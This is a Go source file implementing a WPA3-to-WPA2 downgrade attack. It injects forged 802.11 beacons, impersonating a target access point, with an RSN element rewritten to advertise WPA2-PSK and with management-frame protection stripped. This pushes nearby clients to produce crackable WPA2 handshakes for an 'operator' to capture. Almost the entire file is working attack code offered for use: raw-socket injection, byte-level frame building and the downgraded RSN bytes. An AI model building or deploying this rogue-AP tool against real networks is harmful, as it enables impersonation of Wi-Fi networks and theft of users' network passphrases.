package main

import (
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

// WPA3Downgrade — beacon/injection engine that impersonates a transition-mode
// WPA3 AP with an RSN IE rewritten to advertise WPA2-PSK/CCMP (and optionally
// without PMF). Clients that support both modes fall back and emit a crackable
// WPA2 4-way handshake, which we then have the operator capture with the
// handshake/hunt commands.
//
// Frame layout mirrors c_core/src/wpa3_downgrade_engine.cpp byte-for-byte so the
// two engines report identical beacons (the operator can diff captures).
type WPA3Downgrade struct {
	Iface    string
	BSSID    string
	SSID     string
	Channel  int
	StripPMF bool
	Rate     time.Duration
	Running  atomic.Bool
	Stop     chan struct{}
	sent     atomic.Int64
	errors   atomic.Int64
}

func NewWPA3Downgrade(iface, bssid, ssid string, ch int) *WPA3Downgrade {
	return &WPA3Downgrade{
		Iface: iface, BSSID: bssid, SSID: ssid, Channel: ch,
		StripPMF: true,
		Rate:     50 * time.Millisecond,
		Stop:     make(chan struct{}),
	}
}

func (w *WPA3Downgrade) Run() error {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(0x0003)))
	if err != nil {
		return fmt.Errorf("socket: %w (need CAP_NET_RAW)", err)
	}
	// NOTE: not closed here — the goroutine below owns the fd lifetime.
	if err := syscall.Bind(fd, &syscall.SockaddrLinklayer{
		Protocol: htons(0x0003),
		Ifindex:  ifaceIndex(w.Iface),
	}); err != nil {
		syscall.Close(fd)
		return fmt.Errorf("bind: %w", err)
	}
	if err := setIfaceChannel(w.Iface, w.Channel); err != nil {
		// channel is best-effort: the interface may already be on the right one
		fmt.Printf("[!] channel set warning: %v\n", err)
	}

	bssid, err := parseMac(w.BSSID)
	if err != nil {
		syscall.Close(fd)
		return fmt.Errorf("bad bssid: %w", err)
	}

	w.Running.Store(true)
	rate := w.Rate
	if rate < 10*time.Millisecond {
		rate = 10 * time.Millisecond
	}
	go func() {
		defer syscall.Close(fd)
		ticker := time.NewTicker(rate)
		defer ticker.Stop()
		var seq uint16
		for {
			select {
			case <-w.Stop:
				return
			case <-ticker.C:
				frame := buildDowngradeBeacon(bssid, []byte(w.SSID), w.Channel, w.StripPMF, seq)
				seq++
				sa := &syscall.SockaddrLinklayer{
					Protocol: htons(0x0003),
					Ifindex:  ifaceIndex(w.Iface),
					Halen:    6,
					Addr:     [8]byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
				}
				if err := syscall.Sendto(fd, frame, 0, sa); err != nil {
					w.errors.Add(1)
				} else {
					w.sent.Add(1)
				}
			}
		}
	}()
	return nil
}

func (w *WPA3Downgrade) Stop_() {
	select {
	case <-w.Stop:
		// already closed
	default:
		close(w.Stop)
	}
	w.Running.Store(false)
}

func (w *WPA3Downgrade) Sent() int64   { return w.sent.Load() }
func (w *WPA3Downgrade) Errors() int64 { return w.errors.Load() }

// buildDowngradeBeacon builds a proper 802.11 Beacon with:
//   - RSN IE advertising WPA2-PSK/CCMP (AKM 00:0f:ac:02)
//   - optionally text MFP-required/capable bits cleared (StripPMF)
//   - WMM parameter element (most modern clients expect it)
func buildDowngradeBeacon(bssid, ssid []byte, channel int, stripPMF bool, seq uint16) []byte {
	buf := make([]byte, 0, 256)

	// Frame control: management / Beacon (subtype 0x8) → 0x80 0x00
	buf = append(buf, 0x80, 0x00)
	// Duration
	buf = append(buf, 0x00, 0x00)
	// DA: broadcast
	buf = append(buf, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff)
	// SA: BSSID
	buf = append(buf, bssid...)
	// BSSID
	buf = append(buf, bssid...)
	// Sequence control: 12-bit fragment(frag=0) in low 4, 12-bit seq in high 12.
	// 802.11 sequence-control field is little-endian on the wire.
	sc := uint16((seq & 0x0fff) << 4)
	buf = append(buf, byte(sc), byte(sc>>8))
	// Timestamp (8 bytes)
	buf = append(buf, make([]byte, 8)...)
	// Beacon interval: 100 TU (0x0064)
	buf = append(buf, 0x64, 0x00)
	// Capability info: ESS | Privacy (encrypted) | ShortPreamble (common)
	cap := uint16(0x0001 | 0x0010 | 0x0020)
	buf = append(buf, byte(cap), byte(cap>>8))

	// SSID element
	if len(ssid) > 32 {
		ssid = ssid[:32]
	}
	buf = append(buf, 0x00, byte(len(ssid)))
	buf = append(buf, ssid...)

	// Supported rates: 1, 2, 5.5, 11, 6, 9, 12, 18, 24, 36, 48, 54 with
	// the basic-bit set on the 1/2/5.5/11 Mbps subset.
	buf = append(buf, 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24)

	// DS Parameter (channel)
	buf = append(buf, 0x03, 0x01, byte(channel))

	// RSN IE — the whole point of this engine.
	rsn := buildDowngradedRSN(stripPMF)
	buf = append(buf, rsn...)

	// WMM Parameter element (vendor 221 / OUI 00:50:f2 / type 2)
	buf = append(buf, 0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01,
		0x80, 0x00, 0x03, 0xa4, 0x00, 0x00, 0x27, 0xa4,
		0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32,
		0x2f, 0x00)
	return buf
}

// buildDowngradedRSN emits a WPA2-PSK/CCMP RSN IE. Total TLV length is 22
// bytes (0x16): element id(1) + len(1) + 20 content bytes.
//
//	version(2) | group cipher(4) | pairwise count(2) | pairwise(4) |
//	AKM count(2) | AKM(4) | rsn caps(2)   == 20 content bytes
func buildDowngradedRSN(stripPMF bool) []byte {
	// RSN Capabilities:
	//   bit 6 = MFP required, bit 7 = MFP capable.
	// Transition-mode downgrade clears the required bit so the client sees a
	// plain WPA2 BSS. Capable may stay set (real transition APs advertise it),
	// but required must go for the client to renegotiate WPA2.
	var caps uint16
	if !stripPMF {
		caps = 0x00c0 // capable + required (no downgrade — full WPA3)
	} else {
		caps = 0x0080 // capable, required cleared → downgrades
	}
	return []byte{
		0x30, 0x14, // RSN IE, content length 20 (0x14)
		0x01, 0x00, // version 1
		0x00, 0x0f, 0xac, 0x04, // group cipher = CCMP-128
		0x01, 0x00, // pairwise count = 1
		0x00, 0x0f, 0xac, 0x04, // pairwise cipher = CCMP-128
		0x01, 0x00, // AKM count = 1
		0x00, 0x0f, 0xac, 0x02, // AKM = PSK (not SAE!)
		byte(caps), byte(caps >> 8),
	}
}

func parseMac(s string) ([]byte, error) {
	s = strings.ReplaceAll(s, "-", ":")
	parts := strings.Split(s, ":")
	if len(parts) != 6 {
		return nil, fmt.Errorf("expected AA:BB:CC:DD:EE:FF")
	}
	out := make([]byte, 6)
	for i, p := range parts {
		v, err := hex.DecodeString(p)
		if err != nil || len(v) != 1 {
			return nil, fmt.Errorf("bad octet %q", p)
		}
		out[i] = v[0]
	}
	return out, nil
}

func setIfaceChannel(iface string, ch int) error {
	setChannel(iface, ch)
	return nil
}

func ifaceIndex(name string) int {
	ifi, err := net.InterfaceByName(name)
	if err != nil {
		return 0
	}
	return ifi.Index
}
